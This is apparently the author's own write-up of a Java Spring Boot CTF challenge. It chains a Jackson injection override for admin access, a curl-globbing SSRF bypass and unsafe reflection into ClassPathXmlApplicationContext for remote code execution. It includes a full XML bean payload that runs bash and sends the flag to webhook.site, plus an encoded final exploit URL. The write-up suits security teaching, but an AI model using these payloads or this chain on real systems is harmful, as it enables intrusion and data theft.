# HackerNickName

this is a JAVA challenge i authored for Akasec CTF 2024. it was a Springboot application that has three flaws that should be chained together to achieve RCE and exfiltrate the flag.

# Details

in `HomeController`, the `post` method handles generating new hacker nicknames:

```java
    @PostMapping(consumes="application/json")
    public void post(@RequestBody @Valid Hacker hacker, HttpServletResponse response) {
        hacker.setNickName(nicknameService.getNickName());
        String token = jwtUtil.generateToken(hacker.getInfo());
        Cookie cookie = new Cookie("jwt", token);
        cookie.setHttpOnly(true);
        cookie.setPath("/");
        response.addCookie(cookie);
    }
```

a new `Hacker` instance is built from the request body, `Hacker` class:

```java
public class Hacker {
    @NotBlank
    private final String firstName;
    @NotBlank
    private final String lastName;
    @NotBlank
    private final String favouriteCategory;
    private final UserRole role;
    private String nickName;

    @JsonCreator
    public Hacker(@JsonProperty(value = "firstName", required = true) String firstName,
                  @JsonProperty(value = "lastName", required = true) String lastName,
                  @JsonProperty(value = "favouriteCategory", required = true) String favouriteCategory,
                  @JacksonInject UserRole hackerRole) {
        this.firstName = firstName;
        this.lastName = lastName;
        this.favouriteCategory = favouriteCategory;
        this.role = hackerRole;
    }

    public Boolean isAdmin() {
        return (role.admin);
    }
    [...]
}
```

`role` attribute is injected using `@JacksonInject`, this is the `ObjectMapper` config:

```java
@Configuration
public class JacksonConfig {
    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper objectMapper = new ObjectMapper();
        InjectableValues injectableValues = new InjectableValues.Std().addValue(UserRole.class, new UserRole(false));
        objectMapper.setInjectableValues(injectableValues);
        return objectMapper;
    }
}
```

`admin` attribute of `UserRole` is always `false`, but [@JacksonInject](https://fasterxml.github.io/jackson-annotations/javadoc/2.9/com/fasterxml/jackson/annotation/JacksonInject.html) docs notes that it is possible to override the injected value from JSON if `useInput` is not `false` (default `true`):

```
Usually property is not deserialized from JSON, although it possible to have injected value as default and still allow optional override from JSON.

```

using this misconfiguration, you can generate a session as admin:

![admin](assets/admin.png)

once you have admin session, you can then access `AdminController` which is supposed to allow the admin to update the nicknames list:

```java
    @PostMapping("/update")
    public ResponseEntity<String> post(@RequestParam("url") String url, HttpServletRequest request) throws NullPointerException, IOException, InterruptedException {
        if (!isAdmin(request.getCookies()))
            return ResponseEntity.status(401).body("You are not an admin.");
        URL parsedUrl;
        try {
            parsedUrl = new URL(url);
        } catch (MalformedURLException e) {
            return ResponseEntity.status(401).body(e.getMessage());
        }
        if (!parsedUrl.getProtocol().equals("http") || !parsedUrl.getHost().equals("nicknameservice") || parsedUrl.getPort() != 5000)
            return ResponseEntity.status(401).body("Invalid URL");
        ProcessBuilder pb = new ProcessBuilder("curl", "-f", url, "-o", nicknameService.filePath.toString());
        Process p = pb.start();
        p.waitFor();
        //System.out.println(new String(p.getErrorStream().readAllBytes(), StandardCharsets.UTF_8));
        nicknameService.reload();
        return ResponseEntity.ok("updated.");
    }
```

there is another controller named `ExperimentalSerializerController` which accepts only loopback requests, but fist you need to bypass the checks in `AdminController`, notably:

```java
    URL parsedUrl;
        try {
            parsedUrl = new URL(url);
        } catch (MalformedURLException e) {
            return ResponseEntity.status(401).body(e.getMessage());
        }
        if (!parsedUrl.getProtocol().equals("http") || !parsedUrl.getHost().equals("nicknameservice") || parsedUrl.getPort() != 5000)
            return ResponseEntity.status(401).body("Invalid URL");
```

curl binary has a feature named [globbing](https://ec.haxx.se/cmdline/urls/globbing.html) which is on by default (disabled using `-g`), here is an example:

```
user@host:~$ curl "http://{site,host}.host.example.com"
```

that will send an http request to `http://site.host.example.com` and `http://host.host.example.com`, in our case this url will bypass the checks and send http requests to both `http://nicknameservice:5000/asdf` and `http://localhost:8090/asdf`:

```
http://{localhost:8090,@nicknameservice:5000/}/asdf
```

moving on, now that we can access `ExperimentalSerializerController`:

```java
@Controller
@RequestMapping("/ExperimentalSerializer")
public class ExperimentalSerializerController {

    @GetMapping
    public String experimentalSerializer(@RequestParam(value = "serialized", required = false) String serialized, HttpServletRequest request, Model model) {
        if (!request.getRemoteAddr().equals("127.0.0.1"))
            return "redirect:/";
        if (serialized != null)
        {
            HashMap<String, Object> result = ExperimentalSerializer.deserialize(serialized);
            model.addAttribute("result", result.toString());
        }
        return "serializer";
    }
}
```

this is `ExperimentalSerializer.deserialize()`:

```java
    public static HashMap<String, Object> deserialize(String serialized) {
        ObjectMapper mapper = new ObjectMapper();
        HashMap<String, Object> result = new HashMap<String, Object>();
        try {
            List<SerializationItem> dataList = mapper.readValue(serialized, new TypeReference<List<SerializationItem>>() {});
            for (SerializationItem item : dataList) {
                switch (item.type) {
                    case "string" -> result.put(item.name, item.value);
                    [...]
                    case "object" -> {
                        try {
                            String[] args = item.value.split("\\|");
                            if (args.length == 2) {
                                Class<?> clazz = Class.forName(args[0]);
                                Constructor<?> constructor = clazz.getConstructor(String.class);
                                Object instance = constructor.newInstance(args[1]);
                                result.put(item.name, instance);
                            } else if (args.length == 3) {
                                Class<?> clazz = Class.forName(args[0]);
                                Constructor<?> constructor = clazz.getConstructor(String.class, String.class);
                                Object instance = constructor.newInstance(args[1], args[2]);
                                result.put(item.name, instance);
                            } else {
                                result.put(item.name, "Error: currently only <= 2 arguments are supported.");
                            }
                        } catch (Exception e) {
                            result.put(item.name, null);
                        }
                    }
                }
            }
            return result;
        } catch (Exception e) {
            System.out.println(e.getMessage());
            return (result);
        }
    }
```

you can notice that you can intiate any class, with 1 or 2 constructor parameters, as long as type is `String`, in this case you can use `org.springframework.context.support.ClassPathXmlApplicationContext` which loads XML application context from a remote location, XML application context can define Beans which can be abused to intiaite any java class and call its methods, it also evaluates SpEL expressions used in the XML ([read more](https://vulncheck.com/blog/cve-2023-44604-activemq-in-memory)):

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>curl "https://webhook.site/?flag=$(/readflag|base64)"</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

final `url` for `/admin/update` would be:

```
url=http://{localhost:8090,@nicknameservice:5000/}/ExperimentalSerializer?serialized=%25%35%62%25%37%62%25%32%32%25%37%34%25%37%39%25%37%30%25%36%35%25%32%32%25%33%61%25%32%32%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%32%25%32%63%25%32%32%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%32%25%33%61%25%32%32%25%36%66%25%37%32%25%36%37%25%32%65%25%37%33%25%37%30%25%37%32%25%36%39%25%36%65%25%36%37%25%36%36%25%37%32%25%36%31%25%36%64%25%36%35%25%37%37%25%36%66%25%37%32%25%36%62%25%32%65%25%36%33%25%36%66%25%36%65%25%37%34%25%36%35%25%37%38%25%37%34%25%32%65%25%37%33%25%37%35%25%37%30%25%37%30%25%36%66%25%37%32%25%37%34%25%32%65%25%34%33%25%36%63%25%36%31%25%37%33%25%37%33%25%35%30%25%36%31%25%37%34%25%36%38%25%35%38%25%36%64%25%36%63%25%34%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%37%38%25%37%34%25%37%63%25%36%38%25%37%34%25%37%34%25%37%30%25%37%33%25%33%61%25%32%66%25%32%66%25%36%38%25%36%66%25%37%33%25%37%34%25%32%66%25%37%38%25%36%64%25%36%63%25%32%65%25%37%38%25%36%64%25%36%63%25%32%32%25%32%63%25%32%32%25%36%65%25%36%31%25%36%64%25%36%35%25%32%32%25%33%61%25%32%32%25%35%33%25%36%34%25%32%32%25%37%64%25%35%64
```
